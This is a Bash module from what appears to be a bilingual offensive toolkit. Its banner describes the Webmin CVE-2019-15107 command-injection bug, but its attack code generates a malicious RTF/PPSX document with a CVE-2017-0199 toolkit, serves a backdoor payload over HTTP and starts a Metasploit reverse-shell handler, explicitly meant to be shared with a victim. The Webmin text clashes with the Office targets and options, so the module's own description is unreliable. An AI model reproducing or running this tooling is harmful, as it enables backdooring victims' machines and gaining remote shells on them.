function module_info {
if [ "$language" = "VN" ]; then
cat << !

        Tên: CVE-2019-15107 | Lỗ hổng thực thi mã từ xa Webmin
     Mô-đun: exploit/windows/fileformat/CVE-2019-15107_webmin_rce
   Nền tảng: Unix, Linux
  Kiến trúc: Cmd, x86, x64
  Quyền hạn: Có
    Công bố: 10/08/2019

Cung cấp bởi:
  @jas502n, @vulhub

Mục tiêu khả dụng:
   Id  Tên
   --  ----
   0   Webmin phiên bản từ 1.882 đến 1.921 và được bật "thay đổi mật khẩu người dùng"
!
module_compare
cat << !
Miêu tả:
   Lỗ hổng được bí mật chèn vào mã nguồn của máy chủ xây dựng Webmin bởi một hacker vô danh.
   Khi tính năng "cho phép thay đổi mật khẩu người dùng" được bật, tệp "password_change.cgi" gửi mật khẩu cũ
   đến hàm "encrypt_password" trong tệp "acl/acl-lib.pl" và gọi hàm "unix_crypt". Lổ hổng này tồn tại
   trong hàm mã hóa &unix_crypt. Hàm "unix_crypt" được gọi trong hàm "xác thực mật mật khẩu cũ".Bằng cách
   sử dụng kí tự "|" để đọc file shadow trong quá trình xác thực mật khẩu cũ trông qua yêu cầu POST.
   Khi gửi một yêu cầu với POST data bình thường, chúng ta sẽ nhận được lỗi
   "Failed to change password: The current password is incorrect."
   Tệp "password_change.cgi" sẽ chỉ kiểm tra tham số "old" trên server mà không cần kiểm tra username
   có đúng hay không. Vì vậy, nếu thêm ký tự "|" trong POST data, chúng ta có thể chạy bất kỳ lệnh nào trên
   server thông qua hàm "password_change.cgi".

Tham khảo:
   http://www.webmin.com/exploit.html
   https://www.cvedetails.com/cve/CVE-2019-15107/
   https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15107
   https://nvd.nist.gov/vuln/detail/CVE-2019-15107
   https://www.exploit-db.com/exploits/47293
   https://github.com/vulhub/vulhub/tree/master/webmin/CVE-2019-15107
   https://github.com/jas502n/CVE-2019-15107

!
elif [ "$language" = "EN" ]; then
cat << !

       Name: CVE-2019-15107 | Webmin Remote Code Execution Vulnerability
     Module: exploit/windows/fileformat/CVE-2019-15107_webmin_rce
   Platform: Unix, Linux
       Arch: Cmd, x86, x64
 Privileged: Yes
  Disclosed: 10/08/2019

Provided by:
  @jas502n, @vulhub

Available targets:
   Id  Name
   --  ----
   0   Webmin version 1.882 to 1.921 and enabled "user password change"
!
module_compare
cat << !
Description:
   The vulnerability was secretly inserted into the source code of the Webmin build server by an anonymous hacker.
   When the "allow user password change" feature is enabled, the file "password_change.cgi" sends the old password
   to the "encrypt_password" function in the "acl / acl-lib.pl" file and calls the "unix_crypt" function.
   This vulnerability exists in the &unix_crypt function. The "unix_crypt" function is called in the 
   "old password authentication" function. By using the "|" to read the shadow file during the old password
   authentication process via the POST request. When sending a request with normal POST data, we get the error
   "Failed to change password: The current password is incorrect."
   The file "password_change.cgi" will only check the "old" parameter on the server without checking whether
   the username is correct or not. So if adding the "|" character In the POST data, we can run any command on
   the server via the "password_change.cgi" function.

References:
   http://www.webmin.com/exploit.html
   https://www.cvedetails.com/cve/CVE-2019-15107/
   https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15107
   https://nvd.nist.gov/vuln/detail/CVE-2019-15107
   https://www.exploit-db.com/exploits/47293
   https://github.com/vulhub/vulhub/tree/master/webmin/CVE-2019-15107
   https://github.com/jas502n/CVE-2019-15107

!
fi

}
############ Hàm gán giá trị các biến #####################
function defaul_module_options {
	lhost=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'` > /dev/null 2>&1
	lport="4444"
	backdoor_file=""
	rhost=""
	rport="10000"
	ssl="False"
	menthod="cmd"
	attack_type="Lan"
	publichost=`dig +short myip.opendns.com @resolver1.opendns.com`
	publicport=`echo $lport`
	file_name_lenght=18
	backdoor_file_lenght=18
	publichost_lenght=18
}
############# Hàm kiểm tra chọn lựa để in ra màng hình ###############
function module_compare {
i_characters="i"
g_characters="g"	
_characters1="-"
_characters2="-"
if [[ $file_name_lenght -le 18 ]]; then
	file_name_lenght=18
fi
if [[ $publichost_lenght -le 18 ]]; then
	publichost_lenght=18
fi
if [[ $backdoor_file_lenght -le 18 ]]; then
	backdoor_file_lenght=18
fi
plus_strings=`expr $backdoor_file_lenght + $file_name_lenght + $publichost_lenght`
if  [[ "$plus_strings" -le 54 ]]; then
		module1
else
		module2
fi
}
############### Hàm nhận giá trị nhận vào của biến ###################
function set_module {
		if [[ "$new_processing_variables" = "backdoor_file" ]] || [[ "$new_processing_variables" = "BACKDOOR_FILE" ]] || [[ "$new_processing_variables" = "Backdoor_file" ]]; then
			unset backdoor_file
			backdoor_file=`echo "$module_set" | cut -d "'" -f2` > /dev/null 2>&1
			################ bỏ đi ký tự cuối ####################
			backdoor_name=${backdoor_file##*/}
			backdoor_file_lenght=`echo $backdoor_file | awk '{print length}'`
			if [[ $backdoor_file_lenght -le 18 ]]; then
				backdoor_file_lenght=18
			fi
		elif [[ "$new_processing_variables" = "srvhost" ]] || [[ "$new_processing_variables" = "SRVHOST" ]] || [[ "$new_processing_variables" = "Srvhost" ]]; then
			unset srvhost
			srvhost="$module_set"
		elif [[ "$new_processing_variables" = "srvport" ]] || [[ "$new_processing_variables" = "SRVPORT" ]] || [[ "$new_processing_variables" = "Srvport" ]]; then
			unset srvport
			srvport="$module_set"
		elif [[ "$new_processing_variables" = "rhost" ]] || [[ "$new_processing_variables" = "RHOST" ]] || [[ "$new_processing_variables" = "Rhost" ]]; then
			unset rhost
			rhost="$module_set"
			rhost_lenght=`echo $rhost | awk '{print length}'`
			if [[ $rhost_lenght -le 18 ]]; then
				rhost_lenght=18
			fi
		elif [[ "$new_processing_variables" = "rport" ]] || [[ "$new_processing_variables" = "RPORT" ]] || [[ "$new_processing_variables" = "Rport" ]]; then
			unset rport
			rport="$module_set"
		elif [[ "$new_processing_variables" = "publichost" ]] || [[ "$new_processing_variables" = "PUBLICHOST" ]] || [[ "$new_processing_variables" = "Publichost" ]]; then
			unset publichost
			publichost="$module_set"
			publichost_lenght=`echo $publichost | awk '{print length}'`
			if [[ $publichost_lenght -le 18 ]]; then
				publichost_lenght=18
			fi
		elif [[ "$new_processing_variables" = "publicport" ]] || [[ "$new_processing_variables" = "PUBLICPORT" ]] || [[ "$new_processing_variables" = "Publicport" ]]; then
			unset publicport
			publicport="$module_set"
		elif [[ "$new_processing_variables" = "mix" ]] || [[ "$new_processing_variables" = "MIX" ]] || [[ "$new_processing_variables" = "Mix" ]]; then
			if [[ "$module_set" = "true" ]] || [[ "$module_set" = "TRUE" ]] || [[ "$module_set" = "True" ]]; then
				unset mix
				mix="$module_set"
				unset x
				x="1"
			elif [[ "$module_set" = "false" ]] || [[ "$module_set" = "FALSE" ]] || [[ "$module_set" = "False" ]]; then
				unset mix
				mix="$module_set"
				unset x
				x="0"
			else 	failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
				echo -e "$red[-]$RESET" $failed_to_validate
			fi
		elif [[ "$new_processing_variables" = "attack_type" ]] || [[ "$new_processing_variables" = "ATTACK_TYPE" ]] || [[ "$new_processing_variables" = "Attack_type" ]]; then
			if [[ "$module_set" = "lan" ]] || [[ "$module_set" = "LAN" ]] || [[ "$module_set" = "Lan" ]]; then
				unset attack_type
				attack_type="$module_set"
			elif [[ "$module_set" = "wan" ]] || [[ "$module_set" = "WAN" ]] || [[ "$module_set" = "Wan" ]]; then
				unset attack_type
				attack_type="$module_set"
			else 	failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
				echo -e "$red[-]$RESET" $failed_to_validate
			fi
		fi
}

##################### Hàm canh lề cho biến ###################
############# Khi các biến có độ dài nhỏ hơn 18 ###############
function module1 {
none=" "
myvar=""
	function unset_value {
		unset none
		unset myvar
		unset integer
		none=" "
		myvar=""
	}
file_name=`echo $file_name`
file_name_lenght=`echo $file_name | awk '{print length}'`
	integer=`expr 20 - $file_name_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	file_name=$file_name$myvar
unset_value

backdoor_file=`echo $backdoor_file`
backdoor_file_lenght=`echo $backdoor_file | awk '{print length}'`
	integer=`expr 20 - $backdoor_file_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	backdoor_file=$backdoor_file$myvar
unset_value
mix=`echo $mix`
mix_lenght=`echo $mix | awk '{print length}'`
	integer=`expr 20 - $mix_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	mix=$mix$myvar
unset_value
attack_type=`echo $attack_type`
attack_type_lenght=`echo $attack_type | awk '{print length}'`
	integer=`expr 20 - $attack_type_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	attack_type=$attack_type$myvar
unset_value
srvhost=`echo $srvhost`
srvhost_lenght=`echo $srvhost | awk '{print length}'`
	integer=`expr 20 - $srvhost_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	srvhost=$srvhost$myvar
unset_value
srvport=`echo $srvport`
srvport_lenght=`echo $srvport | awk '{print length}'`
	integer=`expr 20 - $srvport_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	srvport=$srvport$myvar
unset_value
publichost=`echo $publichost`
publichost_lenght=`echo $publichost | awk '{print length}'`
	integer=`expr 20 - $publichost_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	publichost=$publichost$myvar
unset_value
publicport=`echo $publicport`
publicport_lenght=`echo $publicport | awk '{print length}'`
	integer=`expr 20 - $publicport_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	publicport=$publicport$myvar
unset_value
module_banner_1
}
function module2 {
none=" "
myvar=""
	function unset_value {
		unset none
		unset myvar
		unset subtract_compare_value
		none=" "
		myvar=""
	}
publichost=`echo $publichost`
publichost_lenght=`echo $publichost | awk '{print length}'`
file_name=`echo $file_name`
file_name_lenght=`echo $file_name | awk '{print length}'`
backdoor_file=`echo $backdoor_file`
backdoor_file_lenght=`echo $backdoor_file | awk '{print length}'`

subtract_compare1=`expr $publichost_lenght - $backdoor_file_lenght`
subtract_compare2=`expr $file_name_lenght - $backdoor_file_lenght`
subtract_compare3=`expr $file_name_lenght - $publichost_lenght`

if [[ $subtract_compare1 -gt 0 ]]; then
	if [[ $subtract_compare3 -lt 0 ]]; then
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		publichost=$publichost$myvar
	unset_value
		subtract_compare_value=`expr $publichost_lenght - $backdoor_file_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
		subtract_compare_value=`expr $publichost_lenght - $file_name_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		file_name=$file_name$myvar
	unset_value
	
		greater_value=$publichost_lenght
	else 
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		file_name=$file_name$myvar
	unset_value
		subtract_compare_value=`expr $file_name_lenght - $publichost_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		publichost=$publichost$myvar
	unset_value
		subtract_compare_value=`expr $file_name_lenght - $backdoor_file_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
	
		greater_value=$file_name_lenght
	fi
elif [[ $subtract_compare2 -gt 0 ]]; then
	if [[ $subtract_compare3 -gt 0 ]]; then
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		file_name=$file_name$myvar
	unset_value
		subtract_compare_value=`expr $file_name_lenght - $backdoor_file_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
		subtract_compare_value=`expr $file_name_lenght - $publichost_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		publichost=$publichost$myvar
	unset_value
	
		greater_value=$file_name_lenght
	else 
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		publichost=$publichost$myvar
	unset_value
		subtract_compare_value=`expr $publichost_lenght - $file_name_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		file_name=$file_name$myvar
	unset_value
		subtract_compare_value=`expr $publichost_lenght - $backdoor_file_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
	
		greater_value=$publichost_lenght
	fi
else
	if [[ $subtract_compare2 -lt 0 ]]; then
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
		subtract_compare_value=`expr $backdoor_file_lenght - $file_name_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		file_name=$file_name$myvar
	unset_value
		subtract_compare_value=`expr $backdoor_file_lenght - $publichost_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		publichost=$publichost$myvar
	unset_value
	
		greater_value=$backdoor_file_lenght
	else 
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		file_name=$file_name$myvar
	unset_value
		subtract_compare_value=`expr $file_name_lenght - $publichost_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		publichost=$publichost$myvar
	unset_value
		subtract_compare_value=`expr $file_name_lenght - $backdoor_file_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
	
		greater_value=$file_name_lenght
	fi
fi
srvhost=`echo $srvhost`
srvhost_lenght=`echo $srvhost | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $srvhost_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	srvhost=$srvhost$myvar
unset_value
srvport=`echo $srvport`
srvport_lenght=`echo $srvport | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $srvport_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	srvport=$srvport$myvar
unset_value
publicport=`echo $publicport`
publicport_lenght=`echo $publicport | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $publicport_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	publicport=$publicport$myvar
unset_value
mix=`echo $mix`
mix_lenght=`echo $mix | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $mix_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	mix=$mix$myvar
unset_value
attack_type=`echo $attack_type`
attack_type_lenght=`echo $attack_type | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $attack_type_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	attack_type=$attack_type$myvar
unset_value
subtract_compare_value=`expr $greater_value - 17 + 4`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	i_characters=$i_characters$myvar
unset_value
subtract_compare_value=`expr $greater_value - 17 + 4`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	g_characters=$g_characters$myvar
unset_value
subtract_compare_value=`expr $greater_value - 16 + 5`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	_characters1=$_characters1$myvar
unset_value
subtract_compare_value=`expr $greater_value - 16 + 3`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	_characters2=$_characters2$myvar
unset_value

module_banner_2
}
function module_banner_1 {
if [ "$language" = "VN" ]; then
yes="  Có"
no="  Không"
cat << !

Các tùy chọn của mô-đun (exploit/windows/fileformat/CVE-2019-15107_webmin_rce):

   Tên       	  Thiết lập hiện tại 	Yêu cầu   Miêu tả
   ----       	  ---------------- 	--------  -----------
!
elif [ "$language" = "EN" ]; then
yes="  yes"
no="  no "
cat << !

Module options (exploit/windows/fileformat/CVE-2019-15107_webmin_rce):

   Name           Current Setting 	Required  Description
   ----           --------------- 	--------  -----------
   RHOST          $srvhost $no    The target address range or CIDR identifier
   RPORT          $srvport $no    The target address range or CIDR identifier
   SSL         	  $ssl $no    Negotiate SSL/TLS for outgoing connections
   METHOD			  (cmd/backdoor)
!
fi
attack_value=`echo $attack_type`
if [ "$language" = "VN" ]; then
	if [[ "$attack_value" = "wan" ]] || [[ "$attack_value" = "WAN" ]] || [[ "$attack_value" = "Wan" ]]; then
cat << !
   PUBLICHOST     $publichost $yes       Máy chủ lắng nghe trên WAN.
   PUBLICPORT     $publicport $yes       Cổng lắng nge trên WAN,cổng này phải trùng với cổng khởi tạo trên tải trọng.

!
	else echo ""
	fi
elif [ "$language" = "EN" ]; then
	if [[ "$attack_value" = "wan" ]] || [[ "$attack_value" = "WAN" ]] || [[ "$attack_value" = "Wan" ]]; then
cat << !
   PUBLICHOST     $publichost $yes      The public host to listen on.
   PUBLICPORT     $publicport $yes      The public port to listen on,this port must match the port created on the payload.

!
	else echo ""
	fi
fi
		
}
function module_banner_2 {
if [ "$language" = "VN" ]; then
yes="  Có"
no="  Không"
cat << !

Các tùy chọn của mô-đun (exploit/windows/fileformat/CVE-2019-15107_webmin_rce):

   Tên       	  Thiết lập hiện tạ${i_characters}Yêu cầu   Miêu tả
   ----       	  ---------------${_characters1}--------  -----------
   File_name      $file_name $no    Tên của tệp RTF / PPSX độc hại (Hãy chia sẻ tệp này!).
   Mix		  $mix $no    Tạo tập tin RTF bị xáo trộn.
   Backdoor_file  $backdoor_file $yes       Đường dẫn đến tệp thực thi / shell meterpreter / payload.
   SRVHOST        $srvhost $no    Máy chủ lắng nghe. Đây phải là một địa chỉ trên máy cục bộ (mặc định 0.0.0.0).
   SRVPORT        $srvport $no    Cổng lắng nge.
   Attack_type    $attack_type $no    Kiểu tấn công (Lan/Wan).
!
elif [ "$language" = "EN" ]; then
yes=" yes"
no=" no "
cat << !

Module options (exploit/windows/fileformat/CVE-2019-15107_webmin_rce):

   Name           Current Setting${g_characters}Required  Description
   ----           ---------------${_characters2}--------  -----------
   File_name      $file_name$no      Name of malicious RTF/PPSX file (Share this file with victim).
   Mix		  $mix$no      Generate obfuscated RTF file.
   Backdoor_file  $backdoor_file$yes      Path of an executable file / meterpreter shell / payload.
   SRVHOST        $srvhost$no      The local host to listen on.This must be an address on the local machine ( default 0.0.0.0 ).
   SRVPORT        $srvport$no      The local port to listen on.
   Attack_type    $attack_type$no      Attack type (Lan/Wan).
!
fi
attack_value=`echo $attack_type`
if [ "$language" = "VN" ]; then
	if [[ "$attack_value" = "wan" ]] || [[ "$attack_value" = "WAN" ]] || [[ "$attack_value" = "Wan" ]]; then
cat << !
   PUBLICHOST     $publichost $yes       Máy chủ lắng nghe trên WAN, mặc định là địa chỉ IP của router.
   PUBLICPORT     $publicport $yes       Cổng lắng nge trên WAN, cổng này phải trùng với cổng khởi tạo trên tải trọng.

!
	else echo ""
	fi
elif [ "$language" = "EN" ]; then
	if [[ "$attack_value" = "wan" ]] || [[ "$attack_value" = "WAN" ]] || [[ "$attack_value" = "Wan" ]]; then
cat << !
   PUBLICHOST     $publichost$yes      The public host to listen on, default is the IP public address.
   PUBLICPORT     $publicport$yes      The public port to listen on, this port must match the port created on the payload.

!
	else echo ""
	fi
fi
		
}
################# targets ###################
#############################################
function show_targets {
if [ "$language" = "VN" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   0   Các phiên bản chưa được vá lỗi của Microsoft Office 2007,2010,2013,2016 và WordPad

!
elif [ "$language" = "EN" ]; then
cat << !
Exploit target:
   Id  Name
   --  ----
   0   Unpatched versions of Microsoft Office 2007,2010,2013,2016 and WordPad

!
fi
}

function target {
if [ "$language" = "VN" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   0   Các phiên bản chưa được vá lỗi của Microsoft Office 2007,2010,2013,2016 và WordPad

!
elif [ "$language" = "EN" ]; then
cat << !
Exploit target:
   Id  Name
   --  ----
   0   Unpatched versions of Microsoft Office 2007,2010,2013,2016 and WordPad

!
fi
}
################# payload list ###################
#############################################
function payload_list {
path_present=`pwd`
payload_list_file="$path_present/Config/payloads"
cat $payload_data | grep -i "   generic/" > $payload_list_file
cat $payload_data | grep -i "   windows/" >> $payload_list_file
echo "" >> $payload_list_file
}
function output_massage {
	function unset_value {
			unset none
			unset myvar
			unset integer
			none=" "
			myvar=""
		}
none=" "
myvar=""
file_output="$output_file/$file_name"
file_output_lenght=`echo $file_output | awk '{print length}'`
	integer=`expr 70 - $file_output_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	file_output=$file_output$myvar
unset_value
file_name=`echo $file_name`
file_name_lenght=`echo $file_name | awk '{print length}'`
	integer=`expr 70 - $file_name_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	file_name=$file_name$myvar
unset_value
type_file_display=`echo $type_file`
type_file_display_lenght=`echo $type_file_display | awk '{print length}'`
	integer=`expr 70 - $type_file_display_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	type_file_display=$type_file_display$myvar
unset_value
echo -e "$orange"
if [ "$language" = "VN" ]; then
cat << !

  ,-----------------++------------------------------------------------------------------------.
  | Tên file        ||  $file_name|
  | Loại tệp        ||  $type_file_display|
  | Vị trí lưu file ||  $file_output|
  '-----------------++------------------------------------------------------------------------'


!
elif [ "$language" = "EN" ]; then
cat << !

  ,-----------------++------------------------------------------------------------------------.
  | File name       ||  $file_name|
  | File type       ||  $type_file_display|
  | File location   ||  $file_output|
  '-----------------++------------------------------------------------------------------------'


!
fi
echo -e "$RESET"
}
function out_value {
backdoor_file=`echo $backdoor_file`
file_name=`echo $file_name`
mix=`echo $mix`
attack_type=`echo $attack_type`
publichost=`echo $publichost`
publicport=`echo $publicport`
paylo=`echo $paylo`
lhost=`echo $lhost`
lport=`echo $lport`
host=`echo $srvhost`
if [ "$host" = "0.0.0.0" ]; then
	srvhost=`echo $lhost`
else
	srvhost=$host
fi
srvport=`echo $srvport`
}
function module_run {
out_value
module_path_present=`pwd`
module_path_rc_file="$module_path_present/Config"
rc_file="$module_path_rc_file/file.rc"
rm -rf $rc_file > /dev/null 2>&1
touch $rc_file > /dev/null 2>&1
	echo "use multi/handler" >> $rc_file
}
function attack {
#####################
path_present=`pwd`
cd $path_present/../../output
output_file=`pwd`
###################
path_tool="$output_file/../Tools/Vulnerability-Exploit/CVE-2017-0199/"
if [[ "$paylo" != "" ]]; then
	if [[ "$attack_type" = "wan" ]] || [[ "$attack_type" = "WAN" ]] || [[ "$attack_type" = "Wan" ]]; then
		url="http://$publichost:$srvport/test.doc"
		echo "set ReverseListenerBindAddress $lhost" >> $rc_file
		echo "set LHOST $publichost" >> $rc_file
		echo "set LPORT $lport" >> $rc_file
	else
		url="http://$srvhost:$srvport/test.doc"
		echo "set LHOST $lhost" >> $rc_file
		echo "set LPORT $lport" >> $rc_file
	fi
	echo "exploit -j -z" >> $rc_file
	cp $backdoor_file $path_tool > /dev/null 2>&1
	cd $path_tool
	service postgresql start
	echo -e "${BlueF}[*]$RESET $generate_file $file_name"
	xterm -e python cve-2017-0199_toolkit.py -M gen -t $type_file -w $file_name -u $url -x $x
	sleep 1
	echo -e "${BlueF}[*]$RESET $done1 $file_name"
	check_file=`find -name $file_name`
	if [[ "$check_file" != "" ]]; then
	mv $path_tool/$file_name $output_file
	output_massage
		if [[ "$attack_type" = "wan" ]] || [[ "$attack_type" = "WAN" ]] || [[ "$attack_type" = "Wan" ]]; then
		echo -e "${BlueF}[*]$RESET $start_server http://0.0.0.0:$srvport"
		xterm -e python cve-2017-0199_toolkit.py -M exp -t $type_file -e http://$srvhost:$srvport/$backdoor_name -l $backdoor_file -p $srvport &
		cd ../../../Victim
		else
		echo -e "${BlueF}[*]$RESET $start_server http://0.0.0.0:$srvport"
		xterm -e python cve-2017-0199_toolkit.py -M exp -t $type_file -e http://$srvhost:$srvport/$backdoor_name -l $backdoor_file -p $srvport &
		cd ../../../Victim
		fi
		echo -e "${BlueF}[!]$RESET $msf_start ${red}Metasploit Framework${RESET}"
		msfconsole -q -r $rc_file
		rm $path_tool/$backdoor_name > /dev/null 2>&1
		killall xterm > /dev/null 2>&1
		cd $path_present
	else
		rm $path_tool/$backdoor_name > /dev/null 2>&1
		killall xterm > /dev/null 2>&1
		cd $path_present
		echo -e "${red}[-]$RESET $error_gen_file"
	fi
else
	if [[ "$attack_type" = "wan" ]] || [[ "$attack_type" = "WAN" ]] || [[ "$attack_type" = "Wan" ]]; then
		url="http://$publichost:$srvport/test.doc"
	else
		url="http://$srvhost:$srvport/test.doc"
	fi
	cp $backdoor_file $path_tool > /dev/null 2>&1
	cd $path_tool
	echo -e "${BlueF}[*]$RESET $generate_file $file_name"
	xterm -e python cve-2017-0199_toolkit.py -M gen -t $type_file -w $file_name -u $url -x $x
	sleep 1
	echo -e "${BlueF}[*]$RESET $done1 $file_name"
	check_file=`find -name $file_name`
	if [[ "$check_file" != "" ]]; then
	mv $path_tool/$file_name $output_file
	output_massage
		if [[ "$attack_type" = "wan" ]] || [[ "$attack_type" = "WAN" ]] || [[ "$attack_type" = "Wan" ]]; then
		echo -e "${BlueF}[*]$RESET $start_server http://0.0.0.0:$srvport"
		xterm -e python cve-2017-0199_toolkit.py -M exp -t $type_file -e http://$srvhost:$srvport/$backdoor_name -l $backdoor_file -p $srvport
		else
		echo -e "${BlueF}[*]$RESET $start_server http://0.0.0.0:$srvport"
		xterm -e python cve-2017-0199_toolkit.py -M exp -t $type_file -e http://$srvhost:$srvport/$backdoor_name -l $backdoor_file -p $srvport
		fi
		rm $path_tool/$backdoor_name > /dev/null 2>&1
		killall xterm > /dev/null 2>&1
		cd $path_present
	else
		rm $path_tool/$backdoor_name > /dev/null 2>&1
		killall xterm > /dev/null 2>&1
		cd $path_present
		echo -e "${red}[-]$RESET $error_gen_file"
	fi
fi
cd $path_present
}
